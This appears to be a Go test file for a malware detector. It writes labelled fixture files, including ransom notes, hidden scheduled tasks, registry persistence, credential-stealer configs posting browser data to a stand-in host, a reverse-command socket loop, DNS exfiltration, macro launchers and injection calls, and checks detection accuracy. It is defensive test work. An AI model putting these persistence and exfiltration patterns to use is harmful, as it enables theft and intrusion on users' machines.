package main

// Stage 9 synthetic evaluation: all files are inert bytes that are ONLY read.
// Scenarios are deliberately broader than Stage 6: structured task/registry
// definitions, network configurations, Python, JS, C/C++, VBA and lookalikes.
// No file is executed, imported, launched, contacted or quarantined.

import (
 "fmt"
 "os"
 "path/filepath"
 "testing"
)

func TestStage9BroadInertMatrix(t *testing.T) {
 cases:=[]struct{filename,content string;positive bool}{
		{"README_RESTORE_FILES.txt","!!! YOUR DOCUMENTS HAVE BEEN LOCKED !!!\nTo recover your data, send 0.05 BTC to the address below.",true},
		{"README_DECRYPT.txt","Your files have been encrypted. Pay bitcoin to recover them.",true},
		{"RECOVER_FILES.txt","Your files have been encrypted. Send 1 BTC to restore them.",true},
		{"README_restore_data.txt","Your documents have been locked. Pay 2 BTC to decrypt the data.",true},
		{"README_recover_now.txt","Your files have been locked. Transfer BTC to recover everything.",true},
		{"README_restore_key.txt","Your files have been encrypted. Payment in bitcoin is required to recover them.",true},
		{"HiddenLogon.xml","<Task><Triggers><LogonTrigger/></Triggers><Settings><Hidden>true</Hidden></Settings><Principals><Principal><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Actions><Exec><Command>C:\\Users\\Public\\Libraries\\svc-helper.exe</Command></Exec></Actions></Task>",true},
		{"VendorSupport.xml","<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><LogonTrigger/></Triggers><Principals><Principal><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><Hidden>true</Hidden></Settings><Actions><Exec><Command>C:\\Users\\Public\\Libraries\\updater.exe</Command></Exec></Actions></Task>",true},
		{"BootTrigger.xml","<Task><Triggers><BootTrigger/></Triggers><Settings><Hidden>true</Hidden></Settings><Principals><Principal><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Actions><Exec><Command>%TEMP%\\worker.exe</Command></Exec></Actions></Task>",true},
		{"UnusualAdminTask.xml","<Task><Triggers><LogonTrigger/></Triggers><Settings><Hidden>true</Hidden></Settings><Principals><Principal><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Actions><Exec><Command>powershell</Command><Arguments>-File %APPDATA%\\run.ps1</Arguments></Exec></Actions></Task>",true},
		{"HiddenPublicTask.xml","<Task><Triggers><LogonTrigger/></Triggers><Settings><Hidden>true</Hidden></Settings><Principals><Principal><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Actions><Exec><Command>C:\\Users\\Public\\temp\\agent.exe</Command></Exec></Actions></Task>",true},
		{"runkey.reg","Windows Registry Editor Version 5.00\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"Update\"=\"C:\\Users\\Public\\Libraries\\agent.exe\"",true},
		{"shell.reg","Windows Registry Editor Version 5.00\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon]\n\"Shell\"=\"explorer.exe,%APPDATA%\\agent.exe\"",true},
		{"startup-temp.reg","Windows Registry Editor Version 5.00\n[HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"Svc\"=\"%TEMP%\\agent.exe\"",true},
		{"runhelper.reg","Windows Registry Editor Version 5.00\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"Helper\"=\"powershell -File %APPDATA%\\startup.ps1\"",true},
		{"collector.json","{\"enabled\":true,\"targets\":[\"Cookies\",\"Login Data\",\"Wallet\"],\"exfil\":{\"url\":\"https://receiver.example.invalid/upload\",\"method\":\"POST\"}}",true},
		{"collector2.json","{\"enabled\":true,\"targets\":[\"wallet.dat\",\"password vault\"],\"exfil\":{\"url\":\"https://receiver.example.invalid/gate\",\"method\":\"POST\"}}",true},
		{"collect3.json","{\"enabled\":true,\"targets\":[\"Login Data\",\"Cookies\"],\"exfil\":{\"url\":\"http://receiver.example.invalid\",\"method\":\"POST\"}}",true},
		{"collect4.json","{\"enabled\":true,\"targets\":[\"wallet\",\"password\"],\"exfil\":{\"url\":\"https://receiver.example.invalid\",\"method\":\"POST\"}}",true},
		{"locker1.py","def inspect(root, cipher):\n for base, dirs, names in os.walk(root):\n  blob = cipher.encrypt(data)\n  out.write_bytes(blob)",true},
		{"locker2.py","def examine(root, cipher):\n for f in Path(root).rglob('*'):\n  f.write_bytes(cipher.encrypt(data))",true},
		{"locker3.py","def mutate(root, cipher):\n for path in glob.glob(root):\n  payload = cipher.encrypt(data)\n  with open(path,\"wb\") as out: pass",true},
		{"locker4.py","for base, folders, items in os.walk(root):\n data = encryptor.encrypt(blob)\n with open(path, 'wb') as file: pass",true},
		{"browser1.py","con=sqlite3.connect(\"Login Data\")\nrecords=con.execute(query).fetchall()\nrequests.post(\"https://receiver.example.invalid\",data=records)",true},
		{"browser2.py","con=sqlite3.connect(\"Cookies\")\nrows=con.execute(query).fetchall()\nurlopen(request)",true},
		{"remote1.py","sock=socket.socket()\nsock.connect(addr)\ncmd=sock.recv(2048)\nresult=subprocess.run(cmd)\nsock.send(result.stdout)",true},
		{"dns1.py","for packet in packets:\n label=packet.hex()\n socket.gethostbyname(label + '.example.invalid')",true},
		{"wsh1.js","var shell=new ActiveXObject(\"WScript.Shell\");shell.Run(\"powershell -NoProfile -File stage.ps1\");",true},
		{"wsh2.jse","var w=new ActiveXObject(\"WScript.Shell\");w.Run(\"cmd.exe /c helper\");",true},
		{"injector.c","void example(){OpenProcess(0,0,1);VirtualAllocEx(h,0,16,0,0);WriteProcessMemory(h,p,b,16,0);CreateRemoteThread(h,0,0,0,0,0,0);}",true},
		{"injector.cpp","void example(){OpenProcess(0,0,1);VirtualAllocEx(h,0,16,0,0);WriteProcessMemory(h,p,b,16,0);CreateRemoteThread(h,0,0,0,0,0,0);}",true},
		{"autorun.bas","Sub AutoOpen()\n Shell(\"powershell -NoProfile -File example.ps1\")\nEnd Sub",true},
		{"autorun2.bas","Sub Document_Open()\n Set x=CreateObject(\"WScript.Shell\")\n x.Run(\"cmd.exe /c helper\")\nEnd Sub",true},
		{"hidden1.ps1","Invoke-WebRequest -Uri https://example.invalid -OutFile $f\nStart-Process -FilePath $f -WindowStyle Hidden",true},
		{"hidden2.psm1","Invoke-RestMethod -Uri https://example.invalid -OutFile $f\nStart-Process -FilePath $f -W Hidden",true},
		{"README_restore.txt","Instructions: use backup software to restore files. No payment is required.",false},
		{"README_decrypt.txt","This document explains how disk decryption works with your own key.",false},
		{"README_recover_data.txt","Recover your documents from your company backups.",false},
		{"README.txt","Welcome to the project. It includes security training.",false},
		{"ordinary.xml","<Task><Triggers><LogonTrigger/></Triggers><Settings><Hidden>false</Hidden></Settings><Principals><Principal><RunLevel>LeastPrivilege</RunLevel></Principal></Principals><Actions><Exec><Command>C:\\Program Files\\Contoso\\sync.exe</Command></Exec></Actions></Task>",false},
		{"hidden-official.xml","<Task><Triggers><LogonTrigger/></Triggers><Settings><Hidden>true</Hidden></Settings><Principals><Principal><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Actions><Exec><Command>C:\\Program Files\\Contoso\\sync.exe</Command></Exec></Actions></Task>",false},
		{"not-hidden.xml","<Task><Triggers><LogonTrigger/></Triggers><Settings><Hidden>false</Hidden></Settings><Principals><Principal><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Actions><Exec><Command>C:\\Users\\Public\\sync.exe</Command></Exec></Actions></Task>",false},
		{"not-high.xml","<Task><Triggers><LogonTrigger/></Triggers><Settings><Hidden>true</Hidden></Settings><Principals><Principal><RunLevel>LeastPrivilege</RunLevel></Principal></Principals><Actions><Exec><Command>C:\\Users\\Public\\sync.exe</Command></Exec></Actions></Task>",false},
		{"project.xml","<Project><Comment>&lt;Task&gt; task help</Comment><Exec><Command>C:\\Users\\Public\\agent.exe</Command></Exec></Project>",false},
		{"invalid.xml","<?xml version=\"1.0\"?><Task><Exec><Command>%TEMP%\\agent.exe</Command></Exec>",false},
		{"normal.reg","Windows Registry Editor Version 5.00\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"Notes\"=\"C:\\Program Files\\Contoso\\Notes.exe\"",false},
		{"registry_export.reg.txt","Windows Registry Editor Version 5.00\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"Notes\"=\"C:\\Users\\Public\\agent.exe\"",false},
		{"display.reg","Windows Registry Editor Version 5.00\n[HKEY_CURRENT_USER\\Software\\Contoso]\n\"Data\"=\"%TEMP%\\notes.exe\"",false},
		{"disabled_config.json","{\"enabled\":false,\"targets\":[\"Cookies\",\"Login Data\",\"Wallet\"],\"exfil\":{\"url\":\"https://receiver.example.invalid\",\"method\":\"POST\"}}",false},
		{"legit_telemetry.json","{\"enabled\":true,\"targets\":[\"performance\",\"diagnostic\"],\"exfil\":{\"url\":\"https://telemetry.example.invalid\",\"method\":\"POST\"}}",false},
		{"local_study.json","{\"enabled\":true,\"targets\":[\"Cookies\",\"Login Data\"],\"exfil\":{\"url\":\"\",\"method\":\"POST\"}}",false},
		{"package.json","{\"name\":\"ordinary\",\"version\":\"1.2.3\",\"scripts\":{\"build\":\"echo hello\"}}",false},
		{"memory_locker.py","fake_fs={\"notes.pdf\":b\"hello\"}\nfor name, blob in fake_fs.items(): print(name+\".locked\",len(blob))",false},
		{"mock_session.py","class MockSocket:\n def connect(self, addr): pass\n def recv(self, n): return b\"exit\"\n def send(self, data): pass",false},
		{"dns_label_printer.py","for value in rows:\n print(value.hex()+\".example.invalid\")",false},
		{"network_client.py","import socket\ns=socket.socket()\ns.connect((\"127.0.0.1\",9000))",false},
		{"database_checker.py","# sqlite3.connect(\"Login Data\")\n# requests.post(\"https://example.invalid\",data=rows)\nprint(\"safe\")",false},
		{"upload_status.py","requests.post(\"https://example.invalid/status\",json={\"health\":\"ok\"})",false},
		{"dns_help.js","const note=\"nslookup $part.example.invalid\";console.log(note);",false},
		{"wsh-reference.js","const api = \"WScript.Shell\";const s=\"powershell -NoProfile\";function demo(){return api+s}",false},
		{"office-bundle.js","var strings=[\"curl\",\"| sh\",\"exec(\",\"urlopen(\", \"read()\"]; console.log(strings.length);",false},
		{"activex-no-run.js","var x=new ActiveXObject(\"WScript.Shell\");console.log(x);",false},
		{"disabled.c","#if 0\nvoid test(){OpenProcess(0,0,1);VirtualAllocEx(h,0,16,0,0);WriteProcessMemory(h,p,b,16,0);CreateRemoteThread(h,0,0,0,0,0,0);}\n#endif\nint main(){return 0;}",false},
		{"comment.cpp","/* OpenProcess( VirtualAllocEx( WriteProcessMemory( CreateRemoteThread( */\nvoid harmless(){}",false},
		{"macro-sim.bas","Sub AutoOpen()\n MockRun \"powershell -nop\"\nEnd Sub\nPrivate Sub MockRun(x)\nDebug.Print x\nEnd Sub",false},
		{"macro-basic.bas","Sub AutoOpen()\nDebug.Print \"hello\"\nEnd Sub",false},
		{"download-only.ps1","Invoke-WebRequest -Uri https://example.invalid -OutFile $f\nWrite-Host \"prepared\"",false},
		{"process-only.ps1","Start-Process notepad.exe -WindowStyle Hidden",false},
		{"display-encoded.ps1","$flags=\"-EncodedCommand\"\nWrite-Output $flags",false},
		{"awareness.md","Defensive training: the term ransomware and its signs are discussed in this document.",false},
		{"guide.txt","Use a dedicated restoration key to recover your encrypted backups.",false},
		{"simple-task.xml","<Task><Triggers><CalendarTrigger/></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\Program Files\\Contoso\\backup.exe</Command></Exec></Actions></Task>",false},
 }
 root:=t.TempDir()
 tp,fn,fp,tn:=0,0,0,0
 for i,tc:=range cases {
  dir:=filepath.Join(root,fmt.Sprintf("%03d",i))
  if err:=os.MkdirAll(dir,0700);err!=nil{t.Fatal(err)}
  path:=filepath.Join(dir,tc.filename)
  if err:=os.WriteFile(path,[]byte(tc.content),0600);err!=nil{t.Fatal(err)}
  st,err:=os.Stat(path);if err!=nil{t.Fatal(err)}
  finding:=inspectFile(path,st)
  flagged:=finding!=nil
  switch {
   case tc.positive && flagged:tp++
   case tc.positive && !flagged:fn++;t.Logf("STAGE9_MISS %q",tc.filename)
   case !tc.positive && flagged:fp++;t.Logf("STAGE9_FALSE_FLAG %q reasons=%v",tc.filename,finding.Reasons)
   default:tn++
  }
 }
 t.Logf("STAGE9_BROAD_TOTAL TP=%d FN=%d FP=%d TN=%d cases=%d",tp,fn,fp,tn,len(cases))
 if tp+fn!=35 || fp+tn!=37 {t.Fatalf("fixture labels changed")}
 if fn!=0 || fp!=0 {t.Fatalf("Stage 9 fixture acceptance failed; missed=%d falseFlags=%d",fn,fp)}
}
